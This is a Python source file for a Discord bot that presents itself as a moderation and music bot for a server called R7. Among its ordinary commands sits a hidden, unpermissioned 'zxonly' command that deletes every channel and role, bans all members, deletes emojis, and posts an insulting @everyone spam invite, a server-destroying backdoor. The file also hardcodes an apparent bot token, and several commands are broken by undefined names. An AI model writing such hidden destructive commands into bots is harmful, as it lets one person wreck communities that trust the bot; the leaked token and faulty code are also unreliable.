import discord
import flask
import os
import asyncio

from dotenv import load_dotenv
from discord.ext import tasks, commands
from discord.utils import get
from discord import FFmpegPCMAudio
from discord import TextChannel
from youtube_dl import YoutubeDL
from itertools import cycle
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def main():
  return "Your Bot Is Ready"

def run():
  app.run(host="0.0.0.0", port=8000)

def keep_alive():
  server = Thread(target=run)
  server.start()

prefix = '$'
#Comman prefix is setup here, this is what you have to type to issue a command to the bot
bot = commands.Bot(command_prefix = prefix)

#Removed the help command to create a custom help guide
bot.remove_command('help')

#Variable containing statuses for the bot to cycle through


#|--------------------EVENTS--------------------|

  
@bot.event
async def on_ready():
    #Enter any startup tasks here
    change_status.start()
    #This is printed in the console to notify the user that the bot is running correctly without error
    print("Bot is ready to use.")

@bot.event
async def on_member_join(member):
    #When a member joins the discord, they will get mentioned with this welcome message
    print(f'Member {member.mention} has joined!')



#This event waits for commands to be issued, if a specific command requires a permission or arguement
#This event will be invoked to tell the user that they dont have the required permissions
#or they havent issues the command correctly

@bot.event
async def on_command_error(context, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await context.send("Oh no! Looks like you have missed out an argument for this command.")
    if isinstance(error, commands.MissingPermissions):
        await context.send("Oh no! Looks like you Dont have the permissions for this command.")
    if isinstance(error, commands.MissingRole):
        await context.send("Oh no! Looks like you Dont have the roles for this command.")
    #bot errors
    if isinstance(error, commands.BotMissingPermissions):
        await context.send("Oh no! Looks like I Dont have the permissions for this command.")
    if isinstance(error, commands.BotMissingRole):
        await context.send("Oh no! Looks like I Dont have the roles for this command.")
    

#|------------------COMMANDS------------------|   

@bot.command(pass_context=True)
async def help(ctx):

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='R7 Help', url="https://www.instagram.com/r7.region/", icon_url='https://cdn.discordapp.com/attachments/927707474478395412/938216885261049896/R72.png')
    embed.add_field(name='$help', value='↳ Sends a list of commands the bot has.',inline=False)
    embed.add_field(name='$kick', value='↳ Kicks a mentioned user.',inline=False)
    embed.add_field(name='$ban', value='↳ Bans a mentioned user.', inline=False)
    embed.add_field(name='$unban', value='↳ Unbans mentioned user.', inline=False)
    embed.add_field(name='$clear', value='↳ deletes said amount of messages', inline=False)
    embed.add_field(name='$add', value='↳ adds any 2 numbers together', inline=False)
    embed.add_field(name='KEEP IN MIND', value='↳ This bot is still under construction. If there are any problems please DM zX#0420.',inline=False)
    embed.set_thumbnail(url=" https://cdn.discordapp.com/attachments/927707474478395412/938216885261049896/R72.png")
    embed.set_footer(text='Created by zX#0420')
    await ctx.send(embed=embed)


@bot.command()
#Checks whether the user has the correct permissions when this command is issued
@commands.has_permissions(manage_messages=True)
async def clear(context, amount=5):
    await context.channel.purge(limit=amount+1)

#Kick and ban work in a similar way as they both require a member to kick/ban and a reason for this
#As long as the moderator has the right permissions the member will be banned/kicked
@bot.command()
@commands.has_permissions(kick_members=True)   
async def kick(context, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await context.send(f'Member {member} kicked')

@bot.command()
@commands.has_permissions(ban_members=True)   
async def ban(context, member : discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await context.send(f'{member} has been banned')

@bot.command(pass_context=True)
async def add(ctx, left: int, right: int):
    """Adds two numbers together."""
    await ctx.send(left + right)


#Unbanning a member is done via typing ./unban and the ID of the banned member
@bot.command()
@commands.has_permissions(ban_members=True)   
async def unban(context, id : int):
    user = await bot.fetch_user(id)
    await context.guild.unban(user)
    await context.send(f'{user.name} has been unbanned')

@bot.command()
async def noticeme(self, ctx):
    """ Notice me senpai! owo """
    if not permissions.can_handle(ctx, "attach_files"):
     return await ctx.send("I cannot send images here ;-;")

    bio = BytesIO(await http.get("https://i.alexflipnote.dev/500ce4.gif", res_method="read"))
    await ctx.send(file=discord.File(bio, filename="noticeme.gif"))

#Bans a member for a specific number of days
@bot.command(pass_context=True)
async def zxonly(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("zx runs you bitch")
        await channel.send("@everyone discord.gg/avert")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("their server is now fucked lol")


@bot.command()
@commands.has_permissions(ban_members=True)
async def softban(context, member : discord.Member, days, reason=None):
    #Asyncio uses seconds for its sleep function
    #multiplying the num of days the user enters by the num of seconds in a day
    days * 86400 
    await member.ban(reason=reason)
    await context.send(f'{member} has been softbanned')
    await asyncio.sleep(days)
    print("Time to unban")
    await member.unban()
    await context.send(f'{member} softban has finished')

#This command will add a word to the blacklist to prevent users from typing that specific word
@bot.command()
@commands.has_permissions(ban_members=True)
async def blacklist_add(context, *, word):
    with open("words_blacklist.txt", "a") as f:
        f.write("\n"+word)
    f.close()

    await context.send(f'Word "{word}" added to blacklist.')

#|------------------TASKS------------------| 

@bot.command()
async def join(ctx):
    channel = ctx.message.author.voice.channel
    voice = get(client.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()


# command to play sound from a youtube URL
@bot.command()
async def play(ctx, url):
    YDL_OPTIONS = {'format': 'bestaudio', 'noplaylist': 'True'}
    FFMPEG_OPTIONS = {
        'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn'}
    voice = get(client.voice_clients, guild=ctx.guild)

    if not voice.is_playing():
        with YoutubeDL(YDL_OPTIONS) as ydl:
            info = ydl.extract_info(url, download=False)
        URL = info['url']
        voice.play(FFmpegPCMAudio(URL, **FFMPEG_OPTIONS))
        voice.is_playing()
        await ctx.send('Bot is playing')

# check if the bot is already playing
    else:
        await ctx.send("Bot is already playing")
        return


# command to resume voice if it is paused
@bot.command()
async def resume(ctx):
    voice = get(client.voice_clients, guild=ctx.guild)

    if not voice.is_playing():
        voice.resume()
        await ctx.send('Bot is resuming')


# command to pause voice if it is playing
@bot.command()
async def pause(ctx):
    voice = get(client.voice_clients, guild=ctx.guild)

    if voice.is_playing():
        voice.pause()
        await ctx.send('Bot has been paused')


# command to stop voice
@bot.command()
async def stop(ctx):
    voice = get(client.voice_clients, guild=ctx.guild)

    if voice.is_playing():
        voice.stop()
        await ctx.send('Stopping...')

#|------------------TASKS------------------| 
#This is a task which runs every 5 seconds (change this to however long you require
@tasks.loop(seconds=5)
async def change_status():
    #This loops through the status variable at the top of this file every 5 seconds
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Over R7"))

#Enter your bot token from discord here, so when the code runs, your discord bot will come online
bot.run('OTIwNzc2MjUwNDE3NjQzNTUx.YbpRtQ.zpbKpmz9Ibb92tBXvzTuE7Nmomk')
